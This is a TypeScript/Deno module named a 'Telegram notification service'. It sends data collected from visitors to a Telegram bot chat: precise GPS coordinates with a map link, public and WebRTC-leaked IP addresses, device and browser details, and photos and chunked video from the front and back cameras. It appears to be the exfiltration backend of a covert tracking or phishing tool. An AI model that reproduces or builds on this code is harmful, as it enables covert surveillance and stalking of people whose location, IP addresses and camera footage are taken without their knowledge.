// Telegram notification service

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const TELEGRAM_MAIN_CHAT_ID = Deno.env.get("TELEGRAM_MAIN_CHAT_ID");
const TELEGRAM_NOTIFICATION_CHAT_IDS = Deno.env.get("TELEGRAM_NOTIFICATION_CHAT_IDS");

// Parse notification chat IDs from comma-separated string
const getNotificationChatIds = (): number[] => {
  if (!TELEGRAM_NOTIFICATION_CHAT_IDS) return [];
  return TELEGRAM_NOTIFICATION_CHAT_IDS.split(',').map(id => parseInt(id.trim())).filter(id => !isNaN(id));
};

export interface UserDataPayload {
  latitude: number;
  longitude: number;
  accuracy: number;
  publicIP?: string;
  webrtcIPs?: string[];
  device?: string;
  browser?: string;
  userAgent?: string;
  timezone?: string;
  languages?: string;
  localTime?: string;
}

export interface PhotoPayload {
  photoBlob: Blob;
  cameraType: 'front' | 'back';
  userAgent?: string;
  device?: string;
}

export interface VideoPayload {
  videoBlob: Blob;
  chunkNumber: number;
  cameraType: 'front' | 'back';
  userAgent?: string;
  device?: string;
}

export interface StartNotificationPayload {
  timestamp: string;
}

// Send user data to main chat
export async function sendUserDataToTelegram(data: UserDataPayload): Promise<boolean> {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_MAIN_CHAT_ID) {
      console.error('❌ [Telegram] Missing bot token or main chat ID');
      return false;
    }

    const lat = data.latitude.toFixed(6);
    const lng = data.longitude.toFixed(6);
    const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
    
    const deviceEmoji = data.device === 'ios' ? '📱' : data.device === 'android' ? '🤖' : '🖥️';
    const deviceName = data.device === 'ios' ? 'iOS' : data.device === 'android' ? 'Android' : 'Desktop';
    
    let message = `🎯 NEW USER DATA\\n\\n`;
    message += `📍 Geolocation:\\n`;
    message += `   Latitude: ${lat}\\n`;
    message += `   Longitude: ${lng}\\n`;
    message += `   Accuracy: ±${Math.round(data.accuracy)} m\\n`;
    message += `   🗺️ ${googleMapsLink}\\n\\n`;
    
    if (data.publicIP || (data.webrtcIPs && data.webrtcIPs.length > 0)) {
      message += `🌐 IP Addresses:\\n`;
      if (data.publicIP) {
        message += `   Public: ${data.publicIP}\\n`;
      }
      if (data.webrtcIPs && data.webrtcIPs.length > 0) {
        message += `   WebRTC: ${data.webrtcIPs.join(', ')}\\n`;
      }
      message += `\\n`;
    }
    
    if (data.device) {
      message += `${deviceEmoji} Device: ${deviceName}\\n`;
    }
    if (data.browser) {
      message += `🌍 Browser: ${data.browser}\\n`;
    }
    if (data.localTime) {
      message += `⏰ Local Time: ${data.localTime}\\n`;
    }
    if (data.timezone) {
      message += `🕐 Timezone: ${data.timezone}\\n`;
    }
    if (data.languages) {
      message += `🗣️ Languages: ${data.languages}\\n`;
    }
    if (data.userAgent) {
      message += `📱 User-Agent: ${data.userAgent}`;
    }
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_MAIN_CHAT_ID);
    formData.append('text', message);
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      body: formData
    });
    
    if (response.ok) {
      console.log('✅ [Telegram] User data sent successfully');
      return true;
    } else {
      const errorText = await response.text();
      console.error('❌ [Telegram] Failed to send user data:', errorText);
      return false;
    }
  } catch (error) {
    console.error('❌ [Telegram] Error sending user data:', error);
    return false;
  }
}

// Send photo to main chat
export async function sendPhotoToTelegram(data: PhotoPayload): Promise<boolean> {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_MAIN_CHAT_ID) {
      console.error('❌ [Telegram] Missing bot token or main chat ID');
      return false;
    }

    const caption = `📸 Photo from ${data.cameraType} camera\\n${data.device || 'Unknown device'}`;
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_MAIN_CHAT_ID);
    formData.append('photo', data.photoBlob, `photo_${data.cameraType}_${Date.now()}.jpg`);
    formData.append('caption', caption);
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    
    if (response.ok) {
      console.log(`✅ [Telegram] Photo (${data.cameraType}) sent successfully`);
      return true;
    } else {
      const errorText = await response.text();
      console.error(`❌ [Telegram] Failed to send photo (${data.cameraType}):`, errorText);
      return false;
    }
  } catch (error) {
    console.error(`❌ [Telegram] Error sending photo (${data.cameraType}):`, error);
    return false;
  }
}

// Send video to main chat
export async function sendVideoToTelegram(data: VideoPayload): Promise<boolean> {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_MAIN_CHAT_ID) {
      console.error('❌ [Telegram] Missing bot token or main chat ID');
      return false;
    }

    const caption = `🎥 Video chunk #${data.chunkNumber} from ${data.cameraType} camera\\n${data.device || 'Unknown device'}`;
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_MAIN_CHAT_ID);
    formData.append('video', data.videoBlob, `video_${data.cameraType}_chunk${data.chunkNumber}_${Date.now()}.webm`);
    formData.append('caption', caption);
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
      method: 'POST',
      body: formData
    });
    
    if (response.ok) {
      console.log(`✅ [Telegram] Video chunk #${data.chunkNumber} (${data.cameraType}) sent successfully`);
      return true;
    } else {
      const errorText = await response.text();
      console.error(`❌ [Telegram] Failed to send video chunk #${data.chunkNumber} (${data.cameraType}):`, errorText);
      return false;
    }
  } catch (error) {
    console.error(`❌ [Telegram] Error sending video chunk #${data.chunkNumber} (${data.cameraType}):`, error);
    return false;
  }
}

// Send /start notification to notification chat IDs
export async function sendStartNotification(data: StartNotificationPayload): Promise<boolean> {
  try {
    if (!TELEGRAM_BOT_TOKEN) {
      console.error('❌ [Telegram] Missing bot token');
      return false;
    }

    const chatIds = getNotificationChatIds();
    if (chatIds.length === 0) {
      console.warn('⚠️ [Telegram] No notification chat IDs configured');
      return false;
    }

    const message = `🔔 User executed /start command\\n\\nTimestamp: ${data.timestamp}`;
    
    // Send to all notification chat IDs in parallel
    const promises = chatIds.map(async (chatId) => {
      const formData = new FormData();
      formData.append('chat_id', chatId.toString());
      formData.append('text', message);
      
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        body: formData
      });
      
      return response.ok;
    });
    
    const results = await Promise.all(promises);
    const allSuccess = results.every(result => result);
    
    if (allSuccess) {
      console.log('✅ [Telegram] Start notifications sent to all chat IDs');
    } else {
      console.warn('⚠️ [Telegram] Some start notifications failed');
    }
    
    return allSuccess;
  } catch (error) {
    console.error('❌ [Telegram] Error sending start notifications:', error);
    return false;
  }
}
